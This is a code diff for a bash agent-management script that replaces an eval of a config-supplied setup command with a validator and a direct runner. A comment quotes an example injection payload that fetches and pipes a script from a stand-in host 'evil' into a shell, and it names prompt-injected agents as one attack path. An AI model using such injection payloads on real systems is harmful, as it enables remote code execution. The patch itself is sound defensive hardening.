@@ -7,6 +7,81 @@
 #   json_get, repo_name, notify, $WORKSPACES_DIR, $CONFIG_FILE, $RUN_ID
 
 # ============================================================================
+# SETUP-SCRIPT EXECUTION (issue #179)
+# ============================================================================
+#
+# `setup_script` is a per-project config field whose value runs before the
+# employee/validator does its work. Historically it was passed straight to
+# `bash -c` / `eval`, which made config-file write access equivalent to
+# arbitrary code execution as the agent user. Anything that can write to the
+# manager-config — a prompt-injected employee writing to the file via its
+# normal tools, a compromised dashboard API caller, a misconfigured permission
+# — could pivot to a shell.
+#
+# The fix keeps the inline-command UX (the field is still free-text;
+# `npm install`, `pip install -r requirements.txt`, `./scripts/setup.sh`, etc.
+# all still work) but rejects anything that would let an attacker chain or
+# escape: command separators, pipes, redirection, command/variable
+# substitution, subshells, backslash escapes, and newlines. Length is capped
+# at 1024 chars so an attacker can't smuggle a payload through some
+# downstream consumer.
+#
+# This is defense-in-depth, not a sandbox: the configured command itself
+# still runs with whatever privileges the agent user has. The point is that
+# `setup_script="; curl evil | sh"` no longer pivots to RCE just because the
+# attacker found a way to write the field. For richer setup logic, commit a
+# script to the repo and reference it (`./scripts/setup.sh`) — that path is
+# under the repo's review process, not the config file's.
+SETUP_SCRIPT_MAX_LEN=1024
+
+validate_setup_script() {
+    # validate_setup_script <script>
+    # Returns 0 if safe to run, non-zero (with log_error) otherwise.
+    local s="$1"
+    if [ -z "$s" ]; then
+        return 0
+    fi
+    if [ "${#s}" -gt "$SETUP_SCRIPT_MAX_LEN" ]; then
+        log_error "setup_script rejected: length ${#s} exceeds $SETUP_SCRIPT_MAX_LEN"
+        return 1
+    fi
+    # Explicit per-character alternations — avoids ambiguity around how bash
+    # `case` brackets handle backtick / dollar / backslash inside patterns.
+    case "$s" in
+        *';'*|*'&'*|*'|'*|*'`'*|*'$'*|*'<'*|*'>'*|*'('*|*')'*|*'\'*|*$'\n'*)
+            log_error "setup_script rejected: contains forbidden shell metacharacter (one of ; & | \` \$ < > ( ) \\ or newline)"
+            return 1
+            ;;
+    esac
+    return 0
+}
+
+run_setup_script() {
+    # run_setup_script <script> [label]
+    # Validates and executes; returns the script's exit status, or non-zero
+    # on validation failure. Output is left on the caller's stdout/stderr so
+    # they can pipe/tail as they like. Executes via bash word-splitting on a
+    # vetted string — no `eval`, no `bash -c "$untrusted"`.
+    local s="$1"
+    local label="${2:-setup}"
+    if [ -z "$s" ]; then
+        return 0
+    fi
+    if ! validate_setup_script "$s"; then
+        log_error "$label aborted: setup_script failed validation"
+        return 1
+    fi
+    # Word-split the validated string and exec the resulting argv directly.
+    # `set -- $s` here is intentional: we *want* IFS splitting on whitespace
+    # so `npm install -r requirements.txt` becomes a 4-arg invocation. The
+    # validator above already ensured no metacharacters can re-enter the
+    # shell at this point.
+    # shellcheck disable=SC2086
+    set -- $s
+    "$@"
+}
+
+# ============================================================================
 # INTEGRATION BRANCH CONFIGURATION
 # ============================================================================
 
@@ -276,10 +351,11 @@ validate_dev() {
     }
     git pull origin "$dev_branch" 2>/dev/null || true
 
-    # Run setup if provided (e.g. dependency install)
+    # Run setup if provided (e.g. dependency install).
+    # Validator + runner defined above — see issue #179.
     if [ -n "$setup_script" ]; then
         log_info "Running setup: $setup_script"
-        if ! eval "$setup_script" 2>&1 | while IFS= read -r line; do log_info "  [setup] $line"; done; then
+        if ! run_setup_script "$setup_script" "validate_dev($project)" 2>&1 | while IFS= read -r line; do log_info "  [setup] $line"; done; then
             log_warn "Setup script failed, continuing with validation anyway"
         fi
     fi
